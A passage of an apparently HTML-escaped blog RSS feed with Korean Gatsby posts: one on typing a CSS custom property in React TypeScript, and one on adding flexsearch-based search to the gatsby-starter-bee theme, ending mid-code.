+&lt;h2 id=&quot;그렇다면-어떻게-해결했는가&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%EA%B7%B8%EB%A0%87%EB%8B%A4%EB%A9%B4-%EC%96%B4%EB%96%BB%EA%B2%8C-%ED%95%B4%EA%B2%B0%ED%96%88%EB%8A%94%EA%B0%80&quot; aria-label=&quot;그렇다면 어떻게 해결했는가 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;그렇다면 어떻게 해결했는가?&lt;/h2&gt;
+&lt;p&gt;뭐 index.d.ts 라는 파일을 만들고 새로 declare? 재정의 해보고 정의 파일을 src 디렉토리 밖에 빼기도 하고 했지만 당연 안되었다. -_-;;&lt;br&gt;
+&lt;strong&gt;문제는 어떤거 때문에 발생했다는 것을 알고 있고 이걸 어떻게 해결해야 하는지도&lt;/strong&gt; 알고 있지만 그 해결 방법을 구현하는 방법을 몰랐다.&lt;/p&gt;
+&lt;p&gt;마치 해외 여행 나가서 밥 주세요를 그 국가 언어로 못하는 느낌이랄까…&lt;br&gt;
+다시 정리하면 새로 재정의하는 것이 아닌 &lt;strong&gt;해당 css 키가 CSS 속성이라는 것&lt;/strong&gt; 만 알려주면 되는 문제였다.&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;as React.CSSProperties&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;그래서 아래의 코드로 간단하게 해결할 수 있었다.&lt;/p&gt;
+&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;tsx&quot;&gt;&lt;pre class=&quot;language-tsx&quot;&gt;&lt;code class=&quot;language-tsx&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;div&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;className&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;flex flex-col&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token plain-text&quot;&gt;
+  &lt;/span&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;span&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;className&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;font-mono countdown text-3xl&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token plain-text&quot;&gt;
+    &lt;/span&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;span&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;style&lt;/span&gt;&lt;span class=&quot;token script language-javascript&quot;&gt;&lt;span class=&quot;token script-punctuation punctuation&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;token string-property property&quot;&gt;&apos;--value&apos;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; seconds &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;as&lt;/span&gt; React&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;CSSProperties&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;span&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token plain-text&quot;&gt;
+  &lt;/span&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;span&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token plain-text&quot;&gt;
+  sec
+&lt;/span&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;div&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;이 간단한 문제로 고통을 받았더니 맨탈이 흔들렸다.&lt;br&gt;
+주식시장에서 손절칠 때랑 비슷한 유형이지만 맛은 다른 고통…&lt;br&gt;
+이제는 그만 맛보고 싶다 ㅎㅎ&lt;/p&gt;
+&lt;br&gt;
+&lt;p&gt;&lt;a href=&quot;https://stackoverflow.com/questions/52005083/how-to-define-css-variables-in-style-attribute-in-react-and-typescript&quot;&gt;참고한 stackoverflow&lt;/a&gt;&lt;/p&gt;</content:encoded></item><item><title><![CDATA[Gatsby 블로그에 검색 기능을 추가하기 (with Gatsby-starter-bee )]]></title><description><![CDATA[블로그를 갈아타면서… 기존에 쓰던 Hexo 를 버리고 새롭게 이전을 했다. 개인적으로 만들던 플젝에 집중하느라 블로그 이전이 좀 늦었었다. 자잘한 이야기는 뒤로 하고… Gatsby…]]></description><link>https://elfinlas.github.io/gatsby/221027_starter-search-add/</link><guid isPermaLink="false">https://elfinlas.github.io/gatsby/221027_starter-search-add/</guid><pubDate>Thu, 27 Oct 2022 17:10:30 GMT</pubDate><content:encoded>&lt;p&gt;&lt;span
+      class=&quot;gatsby-resp-image-wrapper&quot;
+      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 800px; &quot;
+    &gt;
+      &lt;span
+    class=&quot;gatsby-resp-image-background-image&quot;
+    style=&quot;padding-bottom: 66.66666666666666%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAANCAIAAAAmMtkJAAAACXBIWXMAAAsTAAALEwEAmpwYAAADJElEQVQozwEZA+b8ALXBvOHq8OPr7+30+fD1+e3y9Ont7+nu7+jt7+jt7+jt8OXr7uDm6uLp7+Lp7+Hn7ODm69jf4tbd48DJwQBPXEBPW0tbZ1uGkIaosKvc4eH0+Prz9/rz+Pvq7vHY3d3Y3uLi6fC6w7quuK7DzMiuuK7F0Na2wbNcaTEAKTQRGSYJJTIRIjAVFiIVOkY7Ym1jhpCFmaOXmqGHfoV0i5WEi5ltTlwyRFEpT1w4UV81d4RjZnJDO0YcADhEITQ+HDpCITxFJTZBKDA7Iys3GyYwGTpGHU9dIDNAHzlGIENRFjQ/GDE7Hj1JIEtXKTpFHjpCIzhBIQB3i0CAkkOClUeFmEqFmE2ClE2FmE6Bk0yBk02ClU59j019j0+BkVB7i0t5iUp7i0l5iUd1g0dwfERxfkAAcIUycog1c4k3dIo3eo89eI09fpNDhJlJhJpKiqFQjaNRjaJQjKJRiJ9Qi6BSiZ5RiZ5Th5tQgpdMg5dPAFFlKk9kK1ZrM1lvMltxNmB1OmF1PGd7P2t/PnGFSHeJS3yOTHqNSn6RTnOGR2d7QGd7Pm2AQGR4OGp+OQBfci51hjtvgThzhDpzhDl3hz58jUV/j0WFlUWKmUuNnUyOnk2HmEaClUJ+kEZ4ikRzhD10hkBxgj1zhToAbX8uc4Uzb4A0aHo1a34wc4U3c4VAeIpAeow6dok4coY1fY4+d4k1fI48g5NEeYtAcoNBeYhGf49IfI9AAF5wIlttJ1xtLmh4OGh2NWl5NWt/N3+TPoCSRnaJQXWIPnSFNXmJO216NXiHNHKCMnSDOXiKPnCCPmd6OgBabClvgz5jdDJkdS90hDtxfjx4iT17jjZufzh1hzp1hzl5jDp2hzZqeDFsfTRmdzBwgy9xgzZpejZwfjwAWm4pVmkrXXEnXW8qbX8vcIEydYY6YnMsaHoubX0tZXQuX3IrVGQjYHErcIUrX28jcH8xaXspX3AoY3UyAENRGUpZIl9zKGN2KWZ1LWV1KFtuIVdqIGV4NG9/O2dzMkdVJVlnL1NkJl9oHEFKEU5cFl9vJlhpLEpbJ7efU9Sh3e6KAAAAAElFTkSuQmCC&apos;); background-size: cover; display: block;&quot;
+  &gt;&lt;/span&gt;
+  &lt;img
+        class=&quot;gatsby-resp-image-image&quot;
+        alt=&quot;thumbnail&quot;
+        title=&quot;thumbnail&quot;
+        src=&quot;/static/4ed02aeb41bca1268e84792b70516ac9/5a190/DSC08632.png&quot;
+        srcset=&quot;/static/4ed02aeb41bca1268e84792b70516ac9/5a46d/DSC08632.png 300w,
+/static/4ed02aeb41bca1268e84792b70516ac9/0a47e/DSC08632.png 600w,
+/static/4ed02aeb41bca1268e84792b70516ac9/5a190/DSC08632.png 800w&quot;
+        sizes=&quot;(max-width: 800px) 100vw, 800px&quot;
+        style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
+        loading=&quot;lazy&quot;
+      /&gt;
+    &lt;/span&gt;&lt;/p&gt;
+&lt;h2 id=&quot;블로그를-갈아타면서&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%EB%B8%94%EB%A1%9C%EA%B7%B8%EB%A5%BC-%EA%B0%88%EC%95%84%ED%83%80%EB%A9%B4%EC%84%9C&quot; aria-label=&quot;블로그를 갈아타면서 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;블로그를 갈아타면서…&lt;/h2&gt;
+&lt;p&gt;기존에 쓰던 &lt;strong&gt;Hexo&lt;/strong&gt; 를 버리고 새롭게 이전을 했다.&lt;br&gt;
+개인적으로 만들던 플젝에 집중하느라 블로그 이전이 좀 늦었었다.&lt;/p&gt;
+&lt;p&gt;자잘한 이야기는 뒤로 하고…&lt;br&gt;
+&lt;strong&gt;Gatsby&lt;/strong&gt;로 갈아타면서 직접 블로그를 만들까 했는데 할일이 너무 많아서 포기했다.&lt;br&gt;
+사실 직장 안다니면 한가할 줄 알았는데 전혀…&lt;br&gt;
+할일이 더 많아진거 같다. =.=&lt;/p&gt;
+&lt;p&gt;그래서 직접 개발은 포기하고 다른거 주워서 쓰려고 찾아보니…&lt;br&gt;
+이 블로그 테마가 가장 많이 사용되는거 같았다.
+&lt;a href=&quot;https://github.com/JaeYeopHan/gatsby-starter-bee&quot;&gt;Gatsby-starter-bee&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;근데 이 테마의 단점(?)은 검색 기능이 없다는 것이다.&lt;br&gt;
+그래서 &lt;a href=&quot;https://github.com/JaeYeopHan/gatsby-starter-bee/issues/179&quot;&gt;깃허브 이슈&lt;/a&gt;에도 등록이 되어는 있지만,&lt;br&gt;
+진척은 없었다.&lt;/p&gt;
+&lt;p&gt;그래도 마지막에 &lt;strong&gt;kostyrko&lt;/strong&gt;라는 외국 성님이 뭔가 힌트를 줘서 나도 그거에 맞춰 적용을 해봤다.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;이 내용은 내 블로그에 검색 기능을 추가하는 것&lt;/strong&gt;을 남길 목적으로 포스팅한다.&lt;/p&gt;
+&lt;p&gt;다른 테마 버그나 기타 문의는 &lt;a href=&quot;https://github.com/JaeYeopHan/gatsby-starter-bee&quot;&gt;깃허브 이슈&lt;/a&gt; 등록을 하고 물어보길 바란다.&lt;br&gt;
+(여담인데 요새는 업데이트가 안되고 버려진거 같다.)&lt;/p&gt;
+&lt;p&gt;진행에 앞서…&lt;br&gt;
+내가 사용하는 Node 버전은 &lt;strong&gt;14.15.0&lt;/strong&gt; 버전이다.&lt;br&gt;
+아마 이 테마를 받아서 그대로 사용하는 사람은 저 버전이거나 근처일거라 생각한다.&lt;/p&gt;
+&lt;br&gt;
+&lt;h3 id=&quot;1-npm-패키지-추가&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#1-npm-%ED%8C%A8%ED%82%A4%EC%A7%80-%EC%B6%94%EA%B0%80&quot; aria-label=&quot;1 npm 패키지 추가 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;1. npm 패키지 추가&lt;/h3&gt;
+&lt;p&gt;&lt;strong&gt;package.json&lt;/strong&gt; 파일에 아래의 dependencies 들을 추가하고 설치한다.&lt;/p&gt;
+&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;json&quot;&gt;&lt;pre class=&quot;language-json&quot;&gt;&lt;code class=&quot;language-json&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
+    ...
+    &lt;span class=&quot;token property&quot;&gt;&quot;flexsearch&quot;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;^0.7.21&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
+    &lt;span class=&quot;token property&quot;&gt;&quot;gatsby-plugin-local-search&quot;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;^2.0.1&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
+    &lt;span class=&quot;token property&quot;&gt;&quot;react-use-flexsearch&quot;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;^0.1.1&quot;&lt;/span&gt;
+    ...
+&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;blockquote&gt;
+&lt;p&gt;npm install&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;br&gt;
+&lt;h3 id=&quot;2-파일-수정&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#2-%ED%8C%8C%EC%9D%BC-%EC%88%98%EC%A0%95&quot; aria-label=&quot;2 파일 수정 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;2. 파일 수정&lt;/h3&gt;
+&lt;p&gt;크게 커스텀을 안했다는 가정하에 작성한다.&lt;br&gt;
+아래 코드를 복붙 하지 말고 주석을 참고해서 배치하자.&lt;/p&gt;
+&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;javascript&quot;&gt;&lt;pre class=&quot;language-javascript&quot;&gt;&lt;code class=&quot;language-javascript&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;//pages/index.js 파일 수정&lt;/span&gt;
+
+&lt;span class=&quot;token comment&quot;&gt;//import 추가&lt;/span&gt;
+&lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt; Search &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;../components/search&apos;&lt;/span&gt;
+&lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt; useFlexSearch &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;react-use-flexsearch&apos;&lt;/span&gt;
+
+&lt;span class=&quot;token comment&quot;&gt;//상단 getDistance 함수 근처 (또는 원하는 곳에...)&lt;/span&gt;
+&lt;span class=&quot;token keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;unFlattenResults&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token parameter&quot;&gt;results&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
+  &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; results&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;map&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token parameter&quot;&gt;post&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&gt;&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;token keyword&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt; slug&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; excerpt&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; title&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; category&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; date&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; draft &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; post
+    &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
+      &lt;span class=&quot;token literal-property property&quot;&gt;node&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;token literal-property property&quot;&gt;excerpt&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; excerpt&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
+        &lt;span class=&quot;token literal-property property&quot;&gt;frontmatter&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt; title&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; category&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; date&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; draft &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
+        &lt;span class=&quot;token literal-property property&quot;&gt;fields&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt; slug &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
+      &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
+    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
+  &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
+
+&lt;span class=&quot;token comment&quot;&gt;//아래 상수 있는 부근에.. (이것도 원하는 곳에...)&lt;/span&gt;
+&lt;span class=&quot;token comment&quot;&gt;//const { countOfInitialPost } = siteMetadata.configs&lt;/span&gt;
+
+&lt;span class=&quot;token keyword&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;token function-variable function&quot;&gt;isBrowser&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&gt;&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;typeof&lt;/span&gt; window &lt;span class=&quot;token operator&quot;&gt;!==&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;undefined&apos;&lt;/span&gt;
+&lt;span class=&quot;token keyword&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt; search &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;isBrowser&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; window&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;location
+
+&lt;span class=&quot;token keyword&quot;&gt;const&lt;/span&gt; query &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;URLSearchParams&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;search&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&apos;s&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;token keyword&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;searchQuery&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; setSearchQuery&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;useState&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;query &lt;span class=&quot;token operator&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;token keyword&quot;&gt;const&lt;/span&gt; results &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;useFlexSearch&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;
+  searchQuery&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
+  data&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;localSearchPages&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;index&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
+  data&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;localSearchPages&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;store
+&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;token keyword&quot;&gt;const&lt;/span&gt; posts &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; searchQuery
+  &lt;span class=&quot;token operator&quot;&gt;?&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;unFlattenResults&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;results&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
+  &lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; data&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;allMarkdownRemark&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;edges
+
+&lt;span class=&quot;token comment&quot;&gt;//기존에 사용하던 posts 상수는 주석 처리 해준다.&lt;/span&gt;
+&lt;span class=&quot;token comment&quot;&gt;// const posts = data.allMarkdownRemark.edges&lt;/span&gt;
+
+&lt;span class=&quot;token comment&quot;&gt;//하단에 graphql 부분에 다음과 같이 추가한다.&lt;/span&gt;
+&lt;span class=&quot;token comment&quot;&gt;//localSearchPages 항목을 배치해준다.&lt;/span&gt;
+
+&lt;span class=&quot;token keyword&quot;&gt;export&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;const&lt;/span&gt; pageQuery &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; graphql&lt;span class=&quot;token template-string&quot;&gt;&lt;span class=&quot;token template-punctuation string&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;
+  query {
+    localSearchPages {
+      index
+      store
+    }
+    site {}
+    }&lt;/span&gt;&lt;span class=&quot;token template-punctuation string&quot;&gt;`&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;br&gt;
